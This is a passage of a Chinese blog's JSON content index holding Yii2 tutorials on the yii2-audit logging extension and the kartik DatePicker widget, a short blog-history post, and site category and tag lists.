Debug的功能。在显示请求详细的同时，也会附带几个面板[可通过配置决定显示哪些panel。如图： 2.2【Trails】记录数据库变更 记录字段 记录字段名称 解释 其它说明 Entry ID 操作记录ID - User ID 操作者ID - Action 动作 Create、Update、Delete 等 type model路径 eg.backend\\models\\HlyBaseInfo model ID model ID - Field 受影响的字段 - Diff 改变前后对比 这里会列举该记录被操作前的数据和被改变后的数据。如下图： 配置 记录数据库变更也很方便，只需要在需要记录的model的behaviors函数内加入AuditTrailBehavior： 123456public function behaviors()&#123; return [ &#39;bedezign\\yii2\\audit\\AuditTrailBehavior&#39; ];&#125; 比如记录Post表的变更记录。[会记录增/删/改操作] 12345678910&lt;?phpclass Post extends \\yii\\db\\ActiveRecord&#123; public function behaviors() &#123; [ &#39;class&#39;&#x3D;&gt; &#39;bedezign\\yii2\\audit\\AuditTrailBehavior&#39; ], &#125;&#125; 效果如图： 2.3 记录JavaScript错误记录 记录字段 记录字段名称 解释 其它说明 Entry ID 操作记录ID - Type 错误类型 - Origin 错误来源 例如 localhost/:31:5 //代表HTML源代码第31行有JavaScript错误 Message 错误信息 例如 Uncaught ReferenceError: alert1 is not defined 配置 记录JavaScript错误记录只需要在view视图里使用audit提供的JSLoggingAsset注册当前资源。 12&lt;?php\\bedezign\\yii2\\audit\\web\\JSLoggingAsset::register($this); 2.4 记录Yii2错误记录 记录字段 记录字段名称 解释 其它说明 Entry ID 操作记录ID - Message 错误信息 - ErrorCode 错误码 - File 文件路径 - Line 导致错误的行号 - Hash 错误哈希值 - Created 创建时间 - 如图： 配置 记录错误需要在配置文件config/main里配置,注意console的errorHandler需要设置成注释中的配置。 1234567891011&lt;?php$config &#x3D; [ &#39;components&#39; &#x3D;&gt; [ &#39;errorHandler&#39; &#x3D;&gt; [ &#x2F;&#x2F; web error handler &#39;class&#39; &#x3D;&gt; &#39;\\bedezign\\yii2\\audit\\components\\web\\ErrorHandler&#39;, &#x2F;&#x2F; console error handler &#x2F;&#x2F;&#39;class&#39; &#x3D;&gt; &#39;\\bedezign\\yii2\\audit\\components\\console\\ErrorHandler&#39;, ], ],];","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"},{"name":"yii2-audit","slug":"yii2-audit","permalink":"https://war9.cn/tags/yii2-audit/"}],"author":"Joe shengxin"},{"title":"Yii2 DatePicker小部件的使用","slug":"Yii2-DatePicker小部件的使用","date":"2018-01-02T11:51:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/01/02/Yii2-DatePicker小部件的使用/","link":"","permalink":"https://war9.cn/2018/01/02/Yii2-DatePicker%E5%B0%8F%E9%83%A8%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"**DatePicker **小部件是一个封装了Bootstrap DatePicker插件到Yii2中的一个插件。可以方便的由用户选择日期，以用于快速输入日期数据。该插件是基于Yii2 BootStrap3制作的。如果浏览器不支持Jquery。该组件仍然支持以下四种类型： Simple Input Markup //常用的简单input输入框类型 Component Markup - Addon Prepended //在input前加入 选择日期&amp;清空栏目 按钮 Component Markup - Addon Appended //在input后加入 选择日期&amp;清空栏目 按钮 Inline / Embedded Markup //嵌入式日期选择框 Date Range Markup (from and to dates) //日期范围,从A日期~B日期。 项目地址: https://github.com/kartik-v/yii2-widget-datepicker文档中未尽事宜查看插件手册：http://demos.krajee.com/widget-details/datepicker 安装 通过composer进行安装. 1composer require kartik-v&#x2F;yii2-widget-datepicker &quot;@dev&quot; 部分参数解释 languge：组件显示语言， 缺省设置为：Yii::$app-&gt;language 。eg:en , zh-CN size: 组件大小 参数范围：[lg, md, sm, xs] name: 输入框input的name属性 如果DatePicker是TYPE_RANGE类型必须设置name2 attribute：设置model的属性。如果DatePicker是TYPE_RANGE类型必须设置attribute2 value：设置input的value属性。如果DatePicker是TYPE_RANGE类型可以设置value2 options: 设置input的其它配置，比如placeholder等。。如果DatePicker是TYPE_RANGE类型可以设置options2. separator: 分隔符。一般用于TYPE_RANGE类型的输入框。将在两个input中间显示一个分隔符。默认为“to”。 pluginEvents：插件事件数组。插件可以绑定以下几个事件[show,hide,clearDate,changeDate,changeMonth,changeYear,changeDecade,changeCentury]绑定事件到自定义函数可以进行如下配置： 12345678pluginEvents &#x3D; [ &quot;show&quot; &#x3D;&gt; &quot;function(e) &#123; # &#96;e&#96; here contains the extra attributes &#125;&quot;, &quot;hide&quot; &#x3D;&gt; &quot;function(e) &#123; # &#96;e&#96; here contains the extra attributes &#125;&quot;, &quot;clearDate&quot; &#x3D;&gt; &quot;function(e) &#123; # &#96;e&#96; here contains the extra attributes &#125;&quot;, &quot;changeDate&quot; &#x3D;&gt; &quot;function(e) &#123; # &#96;e&#96; here contains the extra attributes &#125;&quot;, &quot;changeYear&quot; &#x3D;&gt; &quot;function(e) &#123; # &#96;e&#96; here contains the extra attributes &#125;&quot;, &quot;changeMonth&quot; &#x3D;&gt; &quot;function(e) &#123; # &#96;e&#96; here contains the extra attributes &#125;&quot;,]; readonly:设置input是否只读 pluginOptions：插件配置数组，常用配置如下： 完整的配置文档请查看：http://bootstrap-datepicker.readthedocs.io/en/latest/options.html 配置名称 类型 其它说明 autoclose Boolean 默认False，是否自动关闭日期选择框。 clearBtn Boolean 默认False，是否在日期选择框下方显示清空按钮。 container String 默认Body，附加到某个元素上以用于弹出DatePicker。会设置该元素ID为‘#picker-container‘ startDate Date或String 设置该日期，那么该日期之前的日期将不可选择。 endDate Date或String 设置该日期，那么该日期之后的日期将不可选择。 format String 默认“mm/dd/yyyy”。设置日期格式 multidate Boolean或Number 默认False，如果设置为true将允许多选日期。如果特定某个数，将允许选择特定数个日期。 todayBtn Boolean 默认False，是否在日期选择框下方显示今日按钮。点击将输入今日日期。 todayHighlight Boolean 默认False，是否高亮显示今日日期。 type: 组件类型，缺省设置为 TYPE_COMPONENT_PREPEND 或2.参数范围：[TYPE_INPUT, //普通input输入框TYPE_COMPONENT_PREPEND,TYPE_COMPONENT_APPEND,TYPE_INLINE,TYPE_RANGE,TYPE_BUTTON] 以上分别对应 1 ~ 6，使用常量需要DatePicker::常量名称,例如：DatePicker::TYPE_COMPONENT_PREPEND, 注意：官方文档中TYPE_INLINE和TYPE_RANGE的常量值不正确，两个常量顺序写错了。正确的TYPE_INLINE = 4,TYPE_RANGE = 5. 类型名称 是否支持手动输入 功能介绍 其它 TYPE_INPUT 支持 普通输入框,点击输入框，弹出日期选择 – TYPE_COMPONENT_PREPEND 支持 在输入框前加入两个按钮，分别是弹出日期选择和清空输入。 – TYPE_COMPONENT_APPEND 支持 在输入框后加入两个按钮，分别是弹出日期选择和清空输入。 – TYPE_RANGE 支持 日期范围专用，需要配置第二个输入框。两个输入框A和B，如果A日期大于B日期会自动将B日期同步为A日期。 必须配置name2或attribute2 参数，否则会报错。使用该选项需要先安装RANGE扩展。安装方法：composer require kartik-v/yii2-field-range “*” TYPE_INLINE 不支持 将总是显示一个嵌入式的日期选择框。输入框将被加上只读属性。 如果要允许输入日期，可以通过inlineOptions设置 TYPE_BUTTON 不支持 仅显示一个按钮，点击弹出日期选择框，值将被赋值到一个隐藏的输入框内。 可以通过buttonOptions进行配置。 3. 快速使用 使用的时候记的在头部引用组件。 12&lt;?phpuse kartik\\date\\DatePicker; 不使用model的形式不使用ActiveForm和后台传来的model也可以直接在页面里输出该组件，代码如下 123456789echo DatePicker::widget([ &#x27;name&#x27; =&gt; &#x27;check_issue_date&#x27;, &#x27;value&#x27; =&gt; date(&#x27;Y-m-d&#x27;, strtotime(&#x27;+2 days&#x27;)), &#x27;options&#x27; =&gt; [&#x27;placeholder&#x27; =&gt; &#x27;请选择日期 ...&#x27;], &#x27;pluginOptions&#x27; =&gt; [ &#x27;format&#x27; =&gt; &#x27;yyyy-mm-dd&#x27;, &#x27;todayHighlight&#x27; =&gt; true ]]); 显示效果如图： 使用model+ActiveForm的形式在controller里面将model传递给视图。 123456&lt;?php $model = new ServiceHistory(); return $this-&gt;render(&#x27;create&#x27;, [ &#x27;model&#x27; =&gt; $model, ]);?&gt; 在视图中，先创建ActiveForm，再输出DatePicker代码片段如下： 12345678910111213141516171819&lt;?php $form = ActiveForm::begin([]); ?&gt;&lt;?phpecho DatePicker::widget([ &#x27;model&#x27; =&gt; $model,//绑定后台传递的model &#x27;attribute&#x27; =&gt; &#x27;service_start&#x27;,//model里的字段 &#x27;attribute2&#x27; =&gt; &#x27;service_end&#x27;,//model里的字段 &#x27;options&#x27; =&gt; [&#x27;placeholder&#x27; =&gt; &#x27;服务开始时间&#x27;],//设置input1的提示 &#x27;options2&#x27; =&gt; [&#x27;placeholder&#x27; =&gt; &#x27;服务结束时间&#x27;],//设置input2的提示 &#x27;type&#x27; =&gt; DatePicker::TYPE_RANGE,//设置插件类型为日期区间类型。 &#x27;form&#x27; =&gt; $form,//绑定form为activeForm。 &#x27;separator&#x27; =&gt; &#x27;&lt;i class=&quot;glyphicon glyphicon-resize-horizontal&quot;&gt;&lt;/i&gt;&#x27;,//设置分隔符 &#x27;pluginOptions&#x27; =&gt; [//设置插件配置 &#x27;format&#x27; =&gt; &#x27;yyyy-mm-dd&#x27;,//设置日期格式 &#x27;autoclose&#x27; =&gt; true,//设置日期选择框自动关闭 &#x27;todayHighlight&#x27; =&gt; true,//设置今日日期高亮 &#x27;todayBtn&#x27; =&gt; true,//设置在日期选择框下方显示今日按钮。 ], ]);?&gt; 以上代码效果如图：","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"},{"name":"DatePicker","slug":"DatePicker","permalink":"https://war9.cn/tags/DatePicker/"},{"name":"widget","slug":"widget","permalink":"https://war9.cn/tags/widget/"}],"author":"Joe shengxin"},{"title":"第一篇Hexo文章","slug":"第一篇Hexo文章","date":"2017-12-28T15:22:00.000Z","updated":"2021-02-18T17:00:41.969Z","comments":true,"path":"2017/12/28/第一篇Hexo文章/","link":"","permalink":"https://war9.cn/2017/12/28/%E7%AC%AC%E4%B8%80%E7%AF%87Hexo%E6%96%87%E7%AB%A0/","excerpt":"","text":"我的Hexo第一篇文章终于在各种搜索引擎，github搜索下。激动的开始写这篇文章. 时间轴：2021/2/18 历时7天，完成对Kratos WordPress主题的迁移和二次开发，项目迁移到Github，对静态资源进行CDN加速。 2017/12/29 项目迁移到Coding..域名DNS解析转到DNS Pod 2017/12/29 域名DNS解析转到cloudflare下，支持SSL 2017/12/29 设置自定义域名war9.cn 2017/12/28 上传到我的Github 2017/12/27 安装snippet主题 2017/12/27 本地搭建Hexo博客","categories":[{"name":"随笔","slug":"myspace","permalink":"https://war9.cn/categories/myspace/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://war9.cn/tags/Hexo/"},{"name":"github","slug":"github","permalink":"https://war9.cn/tags/github/"}],"author":"Joe shengxin"}],"categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"},{"name":"信息安全","slug":"security","permalink":"https://war9.cn/categories/security/"},{"name":"随笔","slug":"myspace","permalink":"https://war9.cn/categories/myspace/"},{"name":"Django","slug":"develop/Django","permalink":"https://war9.cn/categories/develop/Django/"},{"name":"工具资源","slug":"resources","permalink":"https://war9.cn/categories/resources/"},{"name":"Yii2","slug":"develop/Yii2","permalink":"https://war9.cn/categories/develop/Yii2/"}],"tags":[{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"https://war9.cn/tags/ElasticSearch/"},{"name":"MySQL同步","slug":"MySQL同步","permalink":"https://war9.cn/tags/MySQL%E5%90%8C%E6%AD%A5/"},{"name":"Logstash","slug":"Logstash","permalink":"https://war9.cn/tags/Logstash/"},{"name":"k8s","slug":"k8s","permalink":"https://war9.cn/tags/k8s/"},{"name":"workflow","slug":"workflow","permalink":"https://war9.cn/tags/workflow/"},{"name":"argo-framework","slug":"argo-framework","permalink":"https://war9.cn/tags/argo-framework/"},{"name":"k8s部署","slug":"k8s部署","permalink":"https://war9.cn/tags/k8s%E9%83%A8%E7%BD%B2/"},{"name":"Docker","slug":"Docker","permalink":"https://war9.cn/tags/Docker/"},{"name":"容器漏洞","slug":"容器漏洞","permalink":"https://war9.cn/tags/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://war9.cn/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"name":"Docker漏洞","slug":"Docker漏洞","permalink":"https://war9.cn/tags/Docker%E6%BC%8F%E6%B4%9E/"},{"name":"v2ray","slug":"v2ray","permalink":"https://war9.cn/tags/v2ray/"},{"name":"cdn","slug":"cdn","permalink":"https://war9.cn/tags/cdn/"},{"name":"cloudflare","slug":"cloudflare","permalink":"https://war9.cn/tags/cloudflare/"},{"name":"cloudflarepartner","slug":"cloudflarepartner","permalink":"https://war9.cn/tags/cloudflarepartner/"},{"name":"dnspod","slug":"dnspod","permalink":"https://war9.cn/tags/dnspod/"},{"name":"Hexo","slug":"Hexo","permalink":"https://war9.cn/tags/Hexo/"},{"name":"Hexo加速","slug":"Hexo加速","permalink":"https://war9.cn/tags/Hexo%E5%8A%A0%E9%80%9F/"},{"name":"docker-compose","slug":"docker-compose","permalink":"https://war9.cn/tags/docker-compose/"},{"name":"CDN","slug":"CDN","permalink":"https://war9.cn/tags/CDN/"},{"name":"jsdelivr","slug":"jsdelivr","permalink":"https://war9.cn/tags/jsdelivr/"},{"name":"七牛云","slug":"七牛云","permalink":"https://war9.cn/tags/%E4%B8%83%E7%89%9B%E4%BA%91/"},{"name":"阿里云OSS","slug":"阿里云OSS","permalink":"https://war9.cn/tags/%E9%98%BF%E9%87%8C%E4%BA%91OSS/"},{"name":"腾讯云COS","slug":"腾讯云COS","permalink":"https://war9.cn/tags/%E8%85%BE%E8%AE%AF%E4%BA%91COS/"},{"name":"Hexo-admin","slug":"Hexo-admin","permalink":"https://war9.cn/tags/Hexo-admin/"},{"name":"typora","slug":"typora","permalink":"https://war9.cn/tags/typora/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://war9.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"fastadmin","slug":"fastadmin","permalink":"https://war9.cn/tags/fastadmin/"},{"name":"getshell","slug":"getshell","permalink":"https://war9.cn/tags/getshell/"},{"name":"旁站","slug":"旁站","permalink":"https://war9.cn/tags/%E6%97%81%E7%AB%99/"},{"name":"git","slug":"git","permalink":"https://war9.cn/tags/git/"},{"name":"仓库同步","slug":"仓库同步","permalink":"https://war9.cn/tags/%E4%BB%93%E5%BA%93%E5%90%8C%E6%AD%A5/"},{"name":"git-mirror","slug":"git-mirror","permalink":"https://war9.cn/tags/git-mirror/"},{"name":"sync","slug":"sync","permalink":"https://war9.cn/tags/sync/"},{"name":"Xdebug","slug":"Xdebug","permalink":"https://war9.cn/tags/Xdebug/"},{"name":"PHP调试","slug":"PHP调试","permalink":"https://war9.cn/tags/PHP%E8%B0%83%E8%AF%95/"},{"name":"phpStorm+Xdebug","slug":"phpStorm-Xdebug","permalink":"https://war9.cn/tags/phpStorm-Xdebug/"},{"name":"Django","slug":"Django","permalink":"https://war9.cn/tags/Django/"},{"name":"Python","slug":"Python","permalink":"https://war9.cn/tags/Python/"},{"name":"MariaDB","slug":"MariaDB","permalink":"https://war9.cn/tags/MariaDB/"},{"name":"GlaryUtilitiesPro","slug":"GlaryUtilitiesPro","permalink":"https://war9.cn/tags/GlaryUtilitiesPro/"},{"name":"注册码","slug":"注册码","permalink":"https://war9.cn/tags/%E6%B3%A8%E5%86%8C%E7%A0%81/"},{"name":"PHP","slug":"PHP","permalink":"https://war9.cn/tags/PHP/"},{"name":"PHP漏洞","slug":"PHP漏洞","permalink":"https://war9.cn/tags/PHP%E6%BC%8F%E6%B4%9E/"},{"name":"GD库漏洞","slug":"GD库漏洞","permalink":"https://war9.cn/tags/GD%E5%BA%93%E6%BC%8F%E6%B4%9E/"},{"name":"单元测试","slug":"单元测试","permalink":"https://war9.cn/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"name":"codeception","slug":"codeception","permalink":"https://war9.cn/tags/codeception/"},{"name":"Yii2","slug":"Yii2","permalink":"https://war9.cn/tags/Yii2/"},{"name":"yii2-event","slug":"yii2-event","permalink":"https://war9.cn/tags/yii2-event/"},{"name":"yii2-事件","slug":"yii2-事件","permalink":"https://war9.cn/tags/yii2-%E4%BA%8B%E4%BB%B6/"},{"name":"算法","slug":"算法","permalink":"https://war9.cn/tags/%E7%AE%97%E6%B3%95/"},{"name":"PHPUnit","slug":"PHPUnit","permalink":"https://war9.cn/tags/PHPUnit/"},{"name":"yii2-editable","slug":"yii2-editable","permalink":"https://war9.cn/tags/yii2-editable/"},{"name":"yii2事件","slug":"yii2事件","permalink":"https://war9.cn/tags/yii2%E4%BA%8B%E4%BB%B6/"},{"name":"Yii2教程","slug":"Yii2教程","permalink":"https://war9.cn/tags/Yii2%E6%95%99%E7%A8%8B/"},{"name":"Yii2工具","slug":"Yii2工具","permalink":"https://war9.cn/tags/Yii2%E5%B7%A5%E5%85%B7/"},{"name":"学习资料","slug":"学习资料","permalink":"https://war9.cn/tags/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"},{"name":"PHP资源","slug":"PHP资源","permalink":"https://war9.cn/tags/PHP%E8%B5%84%E6%BA%90/"},{"name":"php组件","slug":"php组件","permalink":"https://war9.cn/tags/php%E7%BB%84%E4%BB%B6/"},{"name":"php框架","slug":"php框架","permalink":"https://war9.cn/tags/php%E6%A1%86%E6%9E%B6/"},{"name":"yii2-audit","slug":"yii2-audit","permalink":"https://war9.cn/tags/yii2-audit/"},{"name":"DatePicker","slug":"DatePicker","permalink":"https://war9.cn/tags/DatePicker/"},{"name":"widget","slug":"widget","permalink":"https://war9.cn/tags/widget/"},{"name":"github","slug":"github","permalink":"https://war9.cn/tags/github/"}]}